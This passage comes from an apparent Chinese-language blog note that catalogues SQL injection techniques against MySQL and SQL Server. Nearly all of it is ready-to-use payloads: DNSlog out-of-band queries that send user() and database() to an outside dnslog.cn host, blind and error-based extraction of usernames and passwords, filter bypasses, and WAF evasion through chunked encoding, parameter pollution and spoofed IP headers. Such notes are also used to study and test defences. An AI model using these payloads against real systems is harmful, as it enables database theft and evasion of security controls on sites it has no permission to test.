src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765539_62cf7ea3330691d8a8415.png" alt="alt text"></p><h3 id="Dnslog对外注入"><a href="#Dnslog对外注入" class="headerlink" title="Dnslog对外注入"></a><strong>Dnslog对外注入</strong></h3><p>通常我们面对SQL注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在SQL注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p><p>注入语句：</p><p>?id&#x3D;1’ and (select load_file(concat(‘\‘,(select hex(user())),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><p>?id&#x3D;1’ and (select load_file(concat(‘\‘,(select database()),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a><strong>中转注入</strong></h3><p>比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p><p>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p><p>可参考：<a href="https://blog.csdn.net/weixin_40412037/article/details/110088186">https://blog.csdn.net/weixin_40412037/article/details/110088186</a></p><h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a><strong>搜索框注入</strong></h3><p>注入payload：</p><p>%’ and ‘%1%’&#x3D;’%1</p><p>%’ and ‘%1%’&#x3D;’%2</p><p>Sql数据库语句：select * from sqltest where names like ‘%要查询的关键字%’</p><p>a%’ and 1&#x3D;1– 正常</p><p>a%’ and 1&#x3D;2– 错误</p><p>有搜索数据的框可以试试加个%总能大力出奇迹</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h3><p>前提</p><p>1.使用了addslashes()函数</p><p>2.数据库设置了编码模式为GBK</p><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><p>?id&#x3D;%df’ and 1&#x3D;1 –+</p><p>?id&#x3D;%df’ and 1&#x3D;2 –+</p><p>?id&#x3D;-1%df’ union select 1,2,3 %23</p><h3 id="Cookie注入和Xff注入"><a href="#Cookie注入和Xff注入" class="headerlink" title="Cookie注入和Xff注入"></a><strong>Cookie注入和Xff注入</strong></h3><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p><p>Cookie: ‘ order by 4–+</p><p>X-Forwarded-For注入</p><p>代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP</p><p>尝试抓包添加插入X-Forwarded-For:127.0.0.1头进行sql注入</p><h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a><strong>Between注入</strong></h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p>mysql语句： select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘b’;</p><p>select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘t’;</p><p>借鉴大佬图片：</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765568_62cf7ec07edc75bbb2cd0.png" alt="alt text"></p><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a><strong>limit注入</strong></h3><p>mysql语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p><p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，而且只能用extractvalue 和 benchmark 函数进行延时</p><p>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</p><p>select id from users;</p><p>select id from users limit 0,1 union select username from users;</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765587_62cf7ed363bca35f96495.png" alt="alt text"></p><p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p><p>基于时间盲注：</p><p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p><h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h3><p>select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</p><p>select * from 表名 order by 列名(或者数字) desc；降序</p><p>当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入，尝试报错注入</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765602_62cf7ee2335a18b91bc38.png" alt="alt text"></p><p>?sort&#x3D;1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p><p>?sort&#x3D;(select 1 from(select 1 and if(ascii(substr((user()),1,1))&#x3D;114,sleep(5),1))x)</p><p><strong>Sql注入绕过姿势</strong></p><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a><strong>绕过空格</strong></h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p><p>payload:</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;<em>!</em>&#x2F;</p><p>最基本的绕过方法，用注释替换空格： &#x2F;* 注释 *&#x2F;</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765618_62cf7ef2f3244c1249103.png" alt="alt text"></p><p>括号绕过空格</p><p>mysql语句：select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p><p>这种过滤方法常常用于time based盲注,例如：</p><p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p><h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a><strong>绕过引号</strong></h3><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><p>select column_name from information_schema.tables where table_name&#x3D;0x7573657273</p><h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a><strong>绕过逗号</strong></h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><p>select substr(database() from 1 for 1);</p><p>select mid(database() from 1 for 1);</p><p>使用join：</p><p>union select 1,2#</p><p>等价于 union select * from (select 1)a join (select 2)b</p><p>使用like:</p><p>select ascii(mid(user(),1,1))&#x3D;80 #</p><p>等价于 select user() like ‘r%’</p><p>对于limit可以使用offset来绕过：</p><p>select * from news limit 0,1 #</p><p>等价于下面这条SQL语句 select * from news limit 1 offset 0</p><h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a><strong>绕过比较符号()</strong></h3><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p><p>select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</p><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p><p>select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</p><h3 id="Between注入-1"><a href="#Between注入-1" class="headerlink" title="Between注入"></a><strong>Between注入</strong></h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765644_62cf7f0c4a9bf9f4e426d.png" alt="alt text"></p><p>使用between and：</p><p>使用between and:</p><p>between a and b：</p><p>between 1 and 1; 等价于 &#x3D;1</p><h3 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a><strong>or and xor not绕过：</strong></h3><p>and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a><strong>绕过注释符</strong></h3><p>（#，–(后面跟一个空格））过滤：</p><p>id&#x3D;1’ union select 1,2,3||’1</p><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><p>id&#x3D;1’ union select 1,2,’3</p><h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a><strong>绕过等于号</strong></h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h3 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a><strong>绕过union，select，where等：</strong></h3><p>（1）使用注释符绕过：</p><p>常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a</p><p>用法：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from user</p><p>（2）使用大小写绕过：</p><p>id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT</p><p>（3）内联注释绕过：</p><p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE &#x2F;&#x2F;!TaBlE_ScHeMa</em>&#x2F; like database()#</p><p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</p><p>id&#x3D;-1’UNIunionONSeLselectECT1,2,3–-</p><p><strong>Sql注入Bypass</strong></p><h3 id="WAF绕过-应用层"><a href="#WAF绕过-应用层" class="headerlink" title="WAF绕过-应用层"></a><strong>WAF绕过-应用层</strong></h3><p>Sql绕过姿势：<a href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p><h4 id="大小写-关键字替换"><a href="#大小写-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><ul><li><p>id&#x3D;1UnIoN&#x2F;**&#x2F;SeLeCT1,user()</p></li><li><p>Hex() bin() 等价于 ascii()</p></li><li><p>Sleep() 等价于 benchmark()</p></li><li><p>Mid() substring() 等价于substr()</p></li><li><p>@@user 等价于 User()</p></li><li><p>@@Version 等价于 version()</p></li></ul><p>绕过：</p><p>AND -&gt; &amp;&amp;</p><p>OR -&gt; || &#x2F; ^</p><p>= -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;，!&lt;&gt;</p><p>&gt; X -&gt; not between 0 and X</p><p>WHERE -&gt; HAVING</p><p>手工盲注 1’||ascii(substr(database(),2,1))&gt;&#x3D;’120</p><h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A等</p><h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F;等</p><h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union&#x3D;&#x3D;uunionnion</p><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在burp抓包时，存在Post请求的注入，如id&#x3D;1’ and 1&#x3D;2#</p><p>尝试分块传输</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765719_62cf7f578b907ecc13fdc.png" alt="alt text"></p><p>进行分块传输的时候，请求头要加上<strong>Transfer-Encoding: Chunked</strong>，然后POST的数据规则如下</p><p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 &#x3D;1 #请求的值，和前面的id连起来 0 #表明分块请求结束，一个0和两个换行</p><p>最后就是大佬写出的插件，安装了一键分块Orz<br><a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &#x3D;&#x3D;&gt;benchmark()<br>concat_ws()&#x3D;&#x3D;&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul><li><p>s-&gt;%73-&gt;%25%37%33</p></li><li><p>hex,unlcode,base64等</p></li></ul><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改Get请求为Post请求</p><ul><li><p>GET POST COOKIE等</p></li><li><p>POST-&gt;multipart&#x2F;form-data</p></li></ul><h4 id="中间件HPP-HTTP参数污染"><a href="#中间件HPP-HTTP参数污染" class="headerlink" title="中间件HPP(HTTP参数污染)"></a>中间件HPP(HTTP参数污染)</h4><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765734_62cf7f6657d4c137788e0.png" alt="alt text"></p><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><ul><li><p>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在GET&#x2F;POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&amp;name=bb">http://www.baidu.com?name=aa&amp;name=bb</a>，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name&#x3D;aa。有的服务器是取第二个参数，也就是name&#x3D;bb。有的服务器两个参数都取，也就是name&#x3D;aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p></li><li><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择</p></li><li><p>通过HPP接管账户,当网站开发者不熟悉Web服务器对于多参数时如何选择，将给攻击者可乘之机。HPP能针对客户端和服务端进行攻击。</p></li><li><p>HPP参数污染还可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p><pre><code class="hljs">http://www.test.com/index.asp?page=select 1,2,3 from table where id=1  http://www.test.com/index.asp?page=select 1&amp;page=2,3 from table where id=1</code></pre></li></ul><p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果,以参数color&#x3D;red&amp;color&#x3D;blue为例</p><h3 id="WAF绕过-数据库特性"><a href="#WAF绕过-数据库特性" class="headerlink" title="WAF绕过-数据库特性"></a><strong>WAF绕过-数据库特性</strong></h3><p>mysql注释符有三种</p><ul><li>#,&#x2F;…&#x2F;,–…(注意–后面有一个空格，或者为–+)</li></ul><p>空格符</p><ul><li>0x09,0x0a-0x0d,0x20,0xa0</li></ul><p>特殊符号：%a换行符</p><ul><li>可结合注释符使用%23%0a,%2d%2d%0a</li></ul><p>内联注释</p><ul><li>&#x2F;!UnIon12345SelEcT&#x2F;1,user(),数字范围1000-50540</li></ul><p>mysql黑魔法</p><ul><li>select{xusername}from{x11test.admin};</li></ul><h3 id="WAF绕过-逻辑层"><a href="#WAF绕过-逻辑层" class="headerlink" title="WAF绕过-逻辑层"></a><strong>WAF绕过-逻辑层</strong></h3><p>逻辑问题</p><ol><li><p>云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</p></li><li><p>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</p></li><li><p>HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p></li><li><p>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id&#x3D;1 %00 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns</p></li></ol><p>性能问题</p><ul><li><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p></li><li><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p></li></ul><p>例子1：</p><p>?id&#x3D;1and(select1)&#x3D;(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><ul><li>0xA*1000指0xA后面A重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</li></ul><p>例子2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p><ul><li>获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</li></ul><p>白名单</p><ul><li><p>方式一：IP白名单</p></li><li><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。测试方法：修改http的header来bypasswaf</p></li></ul><p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p><p>方式二：静态资源</p><ul><li><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p></li><li><p>Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php后面基本不识别</p><pre><code class="hljs">http://10.9.9.201/sql.php?id=1  http://10.9.9.201/sql.php/1.js?id=1</code></pre></li></ul><p>方式三：url白名单</p><ul><li>为了防止误拦，部分waf内置默认的白名单列表，如admin&#x2F;manager&#x2F;system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</li></ul><p>学习文章：<a href="https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q">https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q</a></p><p><strong>Sqlserver注入（mssql）</strong></p><p><strong>SQL Server</strong>数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 – 。延时命令：WAITFOR DELAY ‘0:0:2’</p><p><strong>SQLServer有三个权限级别：</strong></p><ul><li><p>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</p></li><li><p>db权限：文件管理，数据库操作等权限 users-administrators</p></li><li><p>public权限：数据库操作 guest-users</p></li></ul><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765752_62cf7f787d9033b77f774.png" alt="alt text"></p><p>判断是否是SA权限(数据库操作、文件管理、命令执行、注册表读取)</p><ol><li>select is_srvrolemember(‘sysadmin’)</li></ol><p>判断是否是db_owner权限 (数据库操作、文件管理)</p><ol><li>select is_member(‘db_owner’)</li></ol><p>判断是否是public权限 (数据库操作)</p><ol><li>select is_srvrolemember(‘public’)</li></ol><p>SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p><p>附上payload：</p><pre><code class="hljs">    select @@version; #查询数据库的版本    select @@servername; #查询服务名    select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字    select db_name(); #查询当前数据库名    select db_name(1); #查询第一个数据库名    select db_name(2); #查询第二个数据库名    select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner    use tempdb #切换到tempdb表    top n #查询前n条记录    limit 2,3 #查询第2条开始的3条数据，也就是2,3,4    select substring(&#39;string&#39;,2,1) #截取给定字符串的索引为2的1个字符    select ascii(&#39;a&#39;) #查询给定字符串的ascii值    select len(&#39;string&#39;) #查询给定字符串的长度    EXEC sp_spaceused @updateusage = N&#39;TRUE&#39;; #查询当前数据库的大小    sp_spaceused &#39;表名&#39; #查询指定表名的大小    EXEC master.sys.xp_dirtree &#39;\\192.168.106.5\\xx.txt&#39;,0,1;    判断是否是SA权限    select is_srvrolemember(&#39;sysadmin&#39;)    判断是否是db_owner权限    select is_member(&#39;db_owner&#39;)    判断是否是public权限    select is_srvrolemember(&#39;public&#39;)</code></pre><h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a><strong>普通注入</strong></h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点</p><p>id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null 页面出现回显。</p><p>查找所在库名称添加： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4</p><p>找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据</p><p>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4提示: xtype&#x3D;’U’ 为 用户表</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4替换 col_name(object_id(‘manage’),1) 中的1 依次为 2，3，4查出所有列名。</p><p>查取数据: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p><h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a><strong>全回显操作</strong></h2><p>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p><p>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>案例： mozhe_dbv2是数据库名字</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765776_62cf7f9087fb6626ca007.png" alt="alt text"></p><p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p><p>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><p>案例： mange是表名   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765789_62cf7f9d50b3e1805fb70.png" alt="alt text"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;<strong>MSSQL</strong>版本</p><p>And 1&#x3D;(select db_name()) &#x2F;&#x2F;当前数据库名</p><p>and 1&#x3D;(select @@servername) &#x2F;&#x2F;本地服务名</p><p>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F;判断是否是系统管理员sa</p><p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F;判断是否是库权限dbo</p><p>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F;判断是否有库读取权限</p><h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2)单个爆破："></a><strong>(2)单个爆破：</strong></h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名</p><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p><p>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’ ))— 获取第一个列名</p><p>and 1&#x3D;convert(int,(select top 1 username from login ))</p><p>and 1&#x3D;convert(int,(select top 1 password from login ))</p><h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2)全爆语句"></a><strong>(2)全爆语句</strong></h3><p>爆表，要求sqlserver版本2005以上</p><p>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>爆列</p><p>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a><strong>时间注入</strong></h3><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –</p><p>如果是sa权限，就延时。</p><p>案例：</p><p><img 